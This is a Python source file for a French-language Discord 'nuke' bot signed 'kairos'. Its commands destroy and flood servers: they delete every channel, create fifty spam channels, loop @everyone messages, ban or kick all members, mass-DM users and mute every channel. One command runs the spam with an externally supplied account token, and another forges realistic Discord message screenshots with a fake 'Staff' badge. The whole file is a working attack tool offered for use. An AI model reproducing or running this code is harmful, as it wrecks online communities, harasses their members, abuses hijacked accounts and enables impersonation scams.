import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import requests
from PIL import Image, ImageDraw
import io
from datetime import datetime
import os

# Get token from environment variables (Secrets)
TOKEN = os.getenv("DISCORD_TOKEN")
DEVELOPER_IDS = [1173273078621540397, 1131520696363794442, 1158147273381920798]

class NukeBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        # Prefix is now configurable, default is =
        super().__init__(command_prefix='=', intents=intents)

    async def setup_hook(self):
        try:
            await self.tree.sync()
            print(f"Synced slash commands for {self.user}")
        except discord.HTTPException as e:
            print(f"Sync error: {e}")

bot = NukeBot()

def is_developer_check(user_id):
    return user_id in DEVELOPER_IDS

def is_developer_slash():
    async def predicate(interaction: discord.Interaction) -> bool:
        if not is_developer_check(interaction.user.id):
            await interaction.response.send_message("Seuls les devs peuvent utiliser cette commande.", ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)

async def perform_api_action(target_token, action_type, guild_id, message=None):
    """Effectue des actions via l'API Discord directement."""
    headers = {'Authorization': f'Bot {target_token}', 'Content-Type': 'application/json'}
    test_r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if test_r.status_code == 401:
        headers['Authorization'] = target_token

    base_url = f'https://discord.com/api/v9'

    if action_type == "nuke":
        ch_r = requests.get(f'{base_url}/guilds/{guild_id}/channels', headers=headers)
        if ch_r.status_code == 200:
            for ch in ch_r.json():
                requests.delete(f'{base_url}/channels/{ch["id"]}', headers=headers)
        
        for i in range(50):
            payload = {"name": "nuked-by-kairos", "type": 0}
            create_r = requests.post(f'{base_url}/guilds/{guild_id}/channels', headers=headers, json=payload)
            if create_r.status_code == 201:
                new_ch_id = create_r.json()['id']
                for _ in range(10):
                    requests.post(f'{base_url}/channels/{new_ch_id}/messages', headers=headers, json={'content': message or "@everyone NUKED BY KAIROS"})
                    await asyncio.sleep(0.002)

    elif action_type == "spam":
        ch_r = requests.get(f'{base_url}/guilds/{guild_id}/channels', headers=headers)
        if ch_r.status_code == 200:
            channels = [ch['id'] for ch in ch_r.json() if ch.get('type') == 0]
            if not channels: return
            while True:
                for ch_id in channels:
                    requests.post(f'{base_url}/channels/{ch_id}/messages', headers=headers, json={'content': message})
                await asyncio.sleep(0.002)

    elif action_type == "banall":
        m_r = requests.get(f'{base_url}/guilds/{guild_id}/members?limit=1000', headers=headers)
        if m_r.status_code == 200:
            for m in m_r.json():
                m_id = m['user']['id']
                if int(m_id) not in DEVELOPER_IDS:
                    requests.put(f'{base_url}/guilds/{guild_id}/bans/{m_id}', headers=headers, json={"delete_message_days": 1})

    elif action_type == "kickall":
        m_r = requests.get(f'{base_url}/guilds/{guild_id}/members?limit=1000', headers=headers)
        if m_r.status_code == 200:
            for m in m_r.json():
                m_id = m['user']['id']
                if int(m_id) not in DEVELOPER_IDS:
                    requests.delete(f'{base_url}/guilds/{guild_id}/members/{m_id}', headers=headers)

    elif action_type == "dmall":
        m_r = requests.get(f'{base_url}/guilds/{guild_id}/members?limit=1000', headers=headers)
        if m_r.status_code == 200:
            for m in m_r.json():
                m_id = m['user']['id']
                if not m.get('user', {}).get('bot'):
                    dm_r = requests.post(f'{base_url}/users/@me/channels', headers=headers, json={'recipient_id': m_id})
                    if dm_r.status_code == 200:
                        dm_id = dm_r.json()['id']
                        requests.post(f'{base_url}/channels/{dm_id}/messages', headers=headers, json={'content': message})

    elif action_type == "muteall":
        ch_r = requests.get(f'{base_url}/guilds/{guild_id}/channels', headers=headers)
        if ch_r.status_code == 200:
            for ch in ch_r.json():
                if ch.get('type') == 0:
                    requests.put(f'{base_url}/channels/{ch["id"]}/permissions/{guild_id}', 
                               headers=headers, json={"allow": "0", "deny": "2048", "type": 0})
    
    elif action_type == "say":
        requests.post(f'{base_url}/channels/{guild_id}/messages', headers=headers, json={'content': message})

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} ({bot.user.id})')
    activity = discord.Streaming(name="by kairos", url="https://twitch.tv/kairos")
    await bot.change_presence(status=discord.Status.dnd, activity=activity)

# --- Prefix Commands ---
@bot.command(name="nuke")
async def nuke_prefix(ctx, guild_id: str, *, message: str = "@everyone NUKED BY KAIROS"):
    if not is_developer_check(ctx.author.id): return
    await ctx.message.delete()
    bot.loop.create_task(perform_api_action(TOKEN, "nuke", guild_id, message))

@bot.command(name="spam")
async def spam_prefix(ctx, guild_id: str, *, message: str):
    if not is_developer_check(ctx.author.id): return
    await ctx.message.delete()
    bot.loop.create_task(perform_api_action(TOKEN, "spam", guild_id, message))

@bot.command(name="banall")
async def banall_prefix(ctx, guild_id: str):
    if not is_developer_check(ctx.author.id): return
    await ctx.message.delete()
    bot.loop.create_task(perform_api_action(TOKEN, "banall", guild_id))

@bot.command(name="say")
async def say_prefix(ctx, channel_id: str, *, message: str):
    if not is_developer_check(ctx.author.id): return
    await ctx.message.delete()
    bot.loop.create_task(perform_api_action(TOKEN, "say", channel_id, message))

# --- Slash Commands ---
@bot.tree.command(name="nuke", description="Nuke complet par ID (0.002s delay)")
@is_developer_slash()
async def nuke(interaction: discord.Interaction, guild_id: str, message: str = "@everyone NUKED BY KAIROS"):
    await interaction.response.send_message(f"💣 Nuke API lancé sur `{guild_id}`.", ephemeral=True)
    bot.loop.create_task(perform_api_action(TOKEN, "nuke", guild_id, message))

@bot.tree.command(name="spam", description="Spam intensif par ID (0.002s delay)")
@is_developer_slash()
async def spam(interaction: discord.Interaction, guild_id: str, message: str):
    await interaction.response.send_message(f"💬 Spam API lancé sur `{guild_id}`.", ephemeral=True)
    bot.loop.create_task(perform_api_action(TOKEN, "spam", guild_id, message))

@bot.tree.command(name="banall", description="Bannit tout le monde via API")
@is_developer_slash()
async def banall(interaction: discord.Interaction, guild_id: str):
    await interaction.response.send_message(f"🚫 Banall lancé sur `{guild_id}`.", ephemeral=True)
    bot.loop.create_task(perform_api_action(TOKEN, "banall", guild_id))

@bot.tree.command(name="kickall", description="Expulse tout le monde via API")
@is_developer_slash()
async def kickall(interaction: discord.Interaction, guild_id: str):
    await interaction.response.send_message(f"👢 Kickall lancé sur `{guild_id}`.", ephemeral=True)
    bot.loop.create_task(perform_api_action(TOKEN, "kickall", guild_id))

@bot.tree.command(name="dmall", description="Message privé à tout le monde via API")
@is_developer_slash()
async def dmall(interaction: discord.Interaction, guild_id: str, message: str):
    await interaction.response.send_message(f"📩 Dmall lancé sur `{guild_id}`.", ephemeral=True)
    bot.loop.create_task(perform_api_action(TOKEN, "dmall", guild_id, message))

@bot.tree.command(name="muteall", description="Bloque l'écriture via API")
@is_developer_slash()
async def muteall(interaction: discord.Interaction, guild_id: str):
    await interaction.response.send_message(f"🤫 Muteall lancé sur `{guild_id}`.", ephemeral=True)
    bot.loop.create_task(perform_api_action(TOKEN, "muteall", guild_id))

@bot.tree.command(name="token_spam", description="Spam avec token externe (0.002s delay)")
@is_developer_slash()
async def token_spam(interaction: discord.Interaction, target_token: str, guild_id: str, message: str):
    await interaction.response.send_message(f"🔑 Token Spam lancé sur `{guild_id}`.", ephemeral=True)
    bot.loop.create_task(perform_api_action(target_token, "spam", guild_id, message))

@bot.tree.command(name="say", description="Fait parler le bot (ID salon)")
@is_developer_slash()
async def say(interaction: discord.Interaction, channel_id: str, message: str):
    await interaction.response.send_message("✅ Envoyé.", ephemeral=True)
    bot.loop.create_task(perform_api_action(TOKEN, "say", channel_id, message))

@bot.tree.command(name="fakemsg", description="Faux message ultra réaliste avec badges")
@is_developer_slash()
async def fakemsg(interaction: discord.Interaction, member_id: str, message: str):
    await interaction.response.defer(ephemeral=True)
    BG_COLOR, NAME_COLOR, TEXT_COLOR, TIME_COLOR = (49, 51, 56), (242, 243, 245), (219, 222, 225), (148, 155, 164)
    WIDTH, HEIGHT, AVATAR_SIZE, LEFT_MARGIN, TOP_MARGIN = 1000, 90, 40, 16, 14
    img = Image.new('RGB', (WIDTH, HEIGHT), color=BG_COLOR)
    draw = ImageDraw.Draw(img)
    display_name, avatar_url = f"User_{member_id}", "https://cdn.discordapp.com/embed/avatars/0.png"
    r = requests.get(f'https://discord.com/api/v9/users/{member_id}', headers={'Authorization': f'Bot {TOKEN}'})
    if r.status_code == 200:
        data = r.json()
        display_name = data.get('global_name') or data.get('username')
        if data.get('avatar'): avatar_url = f"https://cdn.discordapp.com/avatars/{member_id}/{data['avatar']}.png?size=128"
    try:
        av_resp = requests.get(avatar_url)
        av_img = Image.open(io.BytesIO(av_resp.content)).convert("RGBA").resize((AVATAR_SIZE, AVATAR_SIZE), Image.Resampling.LANCZOS)
        mask = Image.new('L', (AVATAR_SIZE, AVATAR_SIZE), 0)
        ImageDraw.Draw(mask).ellipse((0, 0, AVATAR_SIZE, AVATAR_SIZE), fill=255)
        av_img.putalpha(mask)
        img.paste(av_img, (16, 16), av_img)
    except:
        draw.ellipse([16, 16, 56, 56], fill=(114, 137, 218))
    text_x = 16 + AVATAR_SIZE + 16
    draw.text((text_x, 14), display_name, fill=NAME_COLOR)
    name_len = len(display_name) * 8
    badge_x = text_x + name_len + 10
    draw.rounded_rectangle([badge_x, 14, badge_x + 60, 32], radius=4, fill=(30, 31, 34))
    draw.text((badge_x + 5, 17), "★ Staff", fill=(255, 215, 0))
    timestamp = datetime.now().strftime("%H:%M")
    draw.text((badge_x + 70, 15), timestamp, fill=TIME_COLOR)
    draw.text((text_x, 38), message, fill=TEXT_COLOR)
    arr = io.BytesIO(); img.save(arr, format='PNG'); arr.seek(0)
    await interaction.followup.send(file=discord.File(arr, filename="fakemsg.png"))

if TOKEN: bot.run(TOKEN)
else: print("Missing token.")
